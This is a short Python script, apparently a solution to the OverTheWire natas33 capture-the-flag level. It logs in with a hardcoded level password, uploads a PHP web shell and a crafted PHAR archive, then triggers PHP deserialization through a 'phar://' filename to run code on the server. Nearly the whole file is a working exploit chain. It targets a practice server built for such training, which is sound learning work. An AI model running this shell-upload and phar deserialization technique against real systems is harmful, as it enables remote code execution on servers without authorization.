import requests
import re

URL = "http://natas33.natas.labs.overthewire.org/"
#URL = "http://127.0.0.1/index.php"
USERNAME = "natas33"
PASSWORD = "shoogeiGa2yee3de6Aex8uaXeech5eey"

AUTH = (USERNAME, PASSWORD)

def upload_file(filepath, filename):
    shell = open(filepath, "rb").read()
    files = {'uploadedfile': (filepath, shell, 'multipart/form-data')}
    data = {'filename': filename}
    return requests.post(URL, auth=AUTH, files=files, data=data)

shell_upload = upload_file("pwn.php", "pwn.php")
exploit_upload = upload_file("exploit.phar", "exploit.phar")
exploit_run = upload_file("exploit.phar", "phar://../upload/test.phar")

print(exploit_run.text)
